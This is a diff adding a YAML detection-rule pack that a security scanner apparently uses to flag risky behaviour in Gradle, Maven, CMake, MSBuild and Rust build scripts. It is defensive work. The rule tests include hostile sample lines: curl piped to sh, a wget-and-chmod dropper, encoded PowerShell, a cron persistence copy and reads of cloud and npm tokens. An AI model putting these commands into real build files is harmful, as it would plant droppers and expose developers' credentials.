@@ -1,0 +1,445 @@
+pack:
+  id: cordon.capabilities.build
+  version: 0.1.0
+  license: Apache-2.0
+  source: cordon-builtin
+  description: >
+    Capability primitives for build systems.
+
+    A build file is not configuration. Make recipes are shell, Gradle builds are
+    Groovy or Kotlin programs, CMake has `execute_process`, MSBuild has `Exec`,
+    and every one of them runs when a developer types the command they type
+    without reading anything. That is the same execution context as an install
+    hook, and it was the one the packs did not cover: Python and npm were
+    modelled, and a Gradle build that downloaded and ran a payload was scored as
+    ordinary application code.
+
+    Supplying these primitives is all that is needed. The composites are written
+    against capability names rather than syntax, so every behavioural rule --
+    dropper, exfiltration, decode-and-execute, anti-analysis -- applies to these
+    languages the moment the primitives exist.
+
+rules:
+  # Make is absent from this pack on purpose. A recipe line is executed by
+  # `/bin/sh`, so `capabilities-shell.yaml` declares `makefile` among its
+  # languages and Makefiles inherit the whole shell primitive set. Restating
+  # those patterns here would double every capability hit, which would in turn
+  # make a single decode look like a decode chain.
+  - id: CAP.JVMBUILD.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Build script starts a process
+    message: >
+      This build script runs an external command. A Gradle build file is a
+      program, not a declaration, and its configuration phase executes on every
+      build and on every IDE import -- often before the developer has read a
+      line of it.
+    remediation: >
+      Confirm the command is part of the build. Anything else has no reason to
+      run here.
+    languages: [groovy, kotlin, xml]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\bexec\s*\{'
+        - '\bcommandLine\b'
+        - '\bRuntime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\('
+        - '\bProcessBuilder\s*\('
+        - '\bmaven-antrun-plugin\b'
+        - '<exec\b'
+        - '\bexec-maven-plugin\b'
+    tests:
+      positive:
+        - "exec { commandLine 'sh', '-c', script }"
+        - "Runtime.getRuntime().exec(cmd)"
+        - "<artifactId>maven-antrun-plugin</artifactId>"
+      negative:
+        - "dependencies { implementation 'org.example:lib:1.0' }"
+        - "// executes the test task"
+
+  - id: CAP.JVMBUILD.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Build script reaches the network
+    message: >
+      This build script opens a connection or downloads a file outside the
+      dependency resolver. Declared dependencies are fetched by the resolver and
+      recorded; anything fetched by hand is not.
+    remediation: >
+      Declare what is needed as a dependency so it is resolved, recorded and
+      verifiable.
+    languages: [groovy, kotlin, xml]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\bnew\s+URL\s*\('
+        - '\bURI\s*\.\s*create\s*\('
+        - '\bHttpClient\s*\.\s*newHttpClient\s*\('
+        - '\.\s*openConnection\s*\(\s*\)'
+        - '\bdownload\s*\{'
+        - '\b(?:curl|wget)\b'
+    tests:
+      positive:
+        - "new URL('https://example.invalid/x').text"
+        - "def conn = url.openConnection()"
+      negative:
+        - "repositories { mavenCentral() }"
+        - "url = 'https://repo.maven.apache.org/maven2'"
+
+  - id: CAP.JVMBUILD.CREDENTIAL.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: credential
+    title: Build script reads credentials
+    message: >
+      This build script reads environment variables or credential files.
+      Publishing steps legitimately need a token; it matters combined with
+      anything that leaves the machine.
+    remediation: >
+      No action for this signal alone.
+    languages: [groovy, kotlin, xml]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\bSystem\s*\.\s*getenv\s*\('
+        - '\bSystem\s*\.\s*getProperties\s*\(\s*\)'
+        - '\benvironment\s*\[\s*["'']'
+        - '\bgradle\.properties\b'
+        - '~/\.(?:aws|ssh|docker|m2|gradle)\b'
+    tests:
+      positive:
+        - "def token = System.getenv('NPM_TOKEN')"
+        - "environment['AWS_SECRET_ACCESS_KEY']"
+      negative:
+        - "systemProperty 'file.encoding', 'UTF-8'"
+
+  - id: CAP.JVMBUILD.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Build script decodes data
+    message: >
+      This build script decodes base64 or hex. In a build file that is how a
+      payload arrives without appearing as readable code.
+    remediation: >
+      Keep build inputs readable.
+    languages: [groovy, kotlin, xml]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\bBase64\s*\.\s*(?:getDecoder|getUrlDecoder|getMimeDecoder)\s*\(\s*\)'
+        - '\bdecodeBase64\b'
+        - '\bbase64\s+(?:-d|--decode)\b'
+    tests:
+      positive:
+        - "new String(Base64.getDecoder().decode(blob))"
+      negative:
+        - "Base64.getEncoder().encodeToString(bytes)"
+
+  # ---------------------------------------------------------------------
+  # CMake
+  # ---------------------------------------------------------------------
+  - id: CAP.CMAKE.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: CMake runs a command at configure time
+    message: >
+      `execute_process` runs during configuration, which happens the moment
+      somebody opens the project in an IDE or runs `cmake`. It is not part of
+      the compile step and is not gated by building anything.
+    remediation: >
+      Move work into a build target so it runs when the project is built, and
+      only then.
+    languages: [cmake]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\bexecute_process\s*\('
+        - '\badd_custom_command\s*\('
+        - '\badd_custom_target\s*\('
+    tests:
+      positive:
+        - "execute_process(COMMAND sh -c \"${SCRIPT}\")"
+      negative:
+        - "add_executable(app main.c)"
+
+  - id: CAP.CMAKE.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: CMake downloads at configure time
+    message: >
+      This project fetches content while configuring. `file(DOWNLOAD ...)` and
+      `FetchContent` run before any build, and without a hash nothing verifies
+      what arrives.
+    remediation: >
+      Supply `EXPECTED_HASH`, or vendor the content.
+    languages: [cmake]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\bfile\s*\(\s*DOWNLOAD\b'
+        - '\bFetchContent_Declare\s*\('
+        - '\bExternalProject_Add\s*\('
+        - '\b(?:curl|wget)\b'
+    tests:
+      positive:
+        - "file(DOWNLOAD ${URL} ${DEST})"
+      negative:
+        - "file(WRITE config.h \"\")"
+
+  # ---------------------------------------------------------------------
+  # MSBuild
+  # ---------------------------------------------------------------------
+  - id: CAP.MSBUILD.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: MSBuild runs a command
+    message: >
+      An `Exec` task runs a shell command as part of the build. Restoring or
+      building the project is enough to trigger it.
+    remediation: >
+      Confirm the command belongs to the build.
+    languages: [xml]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '<Exec\s+Command\s*='
+        - '<PreBuildEvent>'
+        - '<PostBuildEvent>'
+    tests:
+      positive:
+        - "<Exec Command=\"powershell -enc SQBFAFgA\" />"
+      negative:
+        - "<Compile Include=\"Program.cs\" />"
+
+  # ---------------------------------------------------------------------
+  # Rust build scripts
+  # ---------------------------------------------------------------------
+  - id: CAP.RUST.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Rust build script starts a process
+    message: >
+      `build.rs` compiles and runs on every `cargo build`, before the crate
+      itself is compiled. It is the Rust equivalent of an install hook.
+    remediation: >
+      Confirm the command is part of the build.
+    languages: [rust]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\bCommand\s*::\s*new\s*\('
+        - '\bstd\s*::\s*process\s*::\s*Command\b'
+    tests:
+      positive:
+        - "Command::new(\"sh\").arg(\"-c\").arg(script).status()"
+      negative:
+        - "let command = parse_command(input);"
+
+  - id: CAP.RUST.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Rust build script reaches the network
+    message: >
+      A build script that downloads content fetches it on every build, outside
+      Cargo's dependency resolution and outside the lockfile.
+    remediation: >
+      Declare what is needed as a crate dependency, or vendor it.
+    languages: [rust]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\breqwest\s*::'
+        - '\bureq\s*::'
+        - '\bTcpStream\s*::\s*connect\s*\('
+        - '\bhyper\s*::\s*Client\b'
+    tests:
+      positive:
+        - "let body = reqwest::blocking::get(url)?.text()?;"
+      negative:
+        - "use std::net::TcpListener;"
+
+  # ---------------------------------------------------------------------
+  # Completing the primitive set
+  #
+  # A language that defines only some primitives inherits only some composite
+  # rules, and the gap is invisible: nothing fails, findings simply do not
+  # appear. The rules below finish each build language's set so it inherits the
+  # whole behavioural pack rather than part of it.
+  # ---------------------------------------------------------------------
+  - id: CAP.BUILD.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: execute
+    title: Build file evaluates code from a string
+    message: >
+      This build file turns a string into code and runs it. Build definitions
+      that construct their own logic cannot be reviewed by reading them, and
+      the construction is usually the point.
+    remediation: >
+      Write the logic out. A build step assembled at build time is a build step
+      nobody approved.
+    languages: [groovy, kotlin, xml, cmake, rust]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\beval\s*[\s(]'
+        - '\bGroovyShell\s*\('
+        - '\bEvaluate\s*\('
+        - '\bcmake_language\s*\(\s*EVAL\b'
+        - '\bScriptEngineManager\s*\('
+        - '\binclude\s*\(\s*\$\{'
+    tests:
+      positive:
+        - "new GroovyShell().evaluate(script)"
+        - "cmake_language(EVAL CODE \"${GENERATED}\")"
+      negative:
+        - "// evaluate the results"
+        - "add_subdirectory(src)"
+
+  - id: CAP.BUILD.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Build file runs what it just downloaded
+    message: >
+      Downloaded content is piped straight into an interpreter, or written and
+      then made executable and run. The thing executed is the thing fetched, so
+      whoever controls the URL controls the build.
+    remediation: >
+      Download to a file, verify it against a pinned digest, and only then run
+      it.
+    languages: [groovy, kotlin, xml, cmake, rust]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:curl|wget)\b[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:sh|bash|zsh|python[0-9.]{0,4}|perl|ruby|node)\b'
+        - '\b(?:curl|wget)\b[^\n]{0,200}-o\s+([^\s]{1,120})[^\n]{0,120}chmod\s+\+x'
+        - '\bchmod\s+\+x[^\n]{0,120}&&[^\n]{0,120}\./'
+    tests:
+      positive:
+        - "\tcurl -sSL https://example.invalid/i.sh | sh"
+        - "\twget https://example.invalid/t -o /tmp/t && chmod +x /tmp/t"
+      negative:
+        - "\tcurl -sSL https://example.invalid/x.tar.gz -o dist.tar.gz"
+        - "\tchmod +x scripts/release.sh"
+
+  - id: CAP.BUILD.PERSIST.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: persist
+    title: Build file installs something that outlives the build
+    message: >
+      This build writes to a location that survives it -- a shell profile, a
+      scheduler, a service unit, or a version-control hook. A build should
+      produce artefacts, not change the machine that ran it.
+    remediation: >
+      Remove the write. Anything a developer's machine needs permanently
+      belongs in documented setup, not in a build step.
+    languages: [groovy, kotlin, xml, cmake, rust]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '~/\.(?:bashrc|zshrc|profile|bash_profile|zprofile)\b'
+        - '/etc/(?:cron\.[a-z]{1,10}|crontab|systemd/system|rc\.local)\b'
+        - '\bcrontab\s+-'
+        - '\bLaunchAgents\b'
+        - '\bgit\s+config\s+(?:--global\s+)?core\.hooksPath\b'
+        - '\.git/hooks/'
+    tests:
+      positive:
+        - "\techo 'x' >> ~/.bashrc"
+        - "\tcp payload /etc/cron.d/update"
+      negative:
+        - "\tcp app $(PREFIX)/bin/app"
+        - "\tinstall -m 0755 app /usr/local/bin"
+
+  - id: CAP.BUILD.CREDENTIAL.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: credential
+    title: Build file reads credentials
+    message: >
+      This build reads environment variables or credential files. Ordinary for
+      a publish step; it matters combined with anything that leaves the
+      machine.
+    remediation: >
+      No action for this signal alone.
+    languages: [cmake, rust]
+    baseline_hits: 0
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\bstd\s*::\s*env\s*::\s*var(?:_os)?\s*\('
+        - '\benv\s*!\s*\('
+        - '\$ENV\{[A-Z_]{0,40}(?:TOKEN|SECRET|PASSWORD|KEY|CREDENTIAL)'
+        - '~/\.(?:aws|ssh|docker|npmrc|kube|cargo)\b'
+    tests:
+      positive:
+        - "let token = std::env::var(\"NPM_TOKEN\").unwrap();"
+        - "message(\"$ENV{AWS_SECRET_ACCESS_KEY}\")"
+        # Reading *any* environment variable is the primitive, as it is in the
+        # Python pack. Narrowing to credential-shaped names would be evaded by
+        # reading the environment into a map and indexing it afterwards.
+        - "let path = std::env::var(\"PATH\").unwrap();"
+      negative:
+        - "let path = config.path.clone();"
+        - "message(\"building ${PROJECT_NAME}\")"
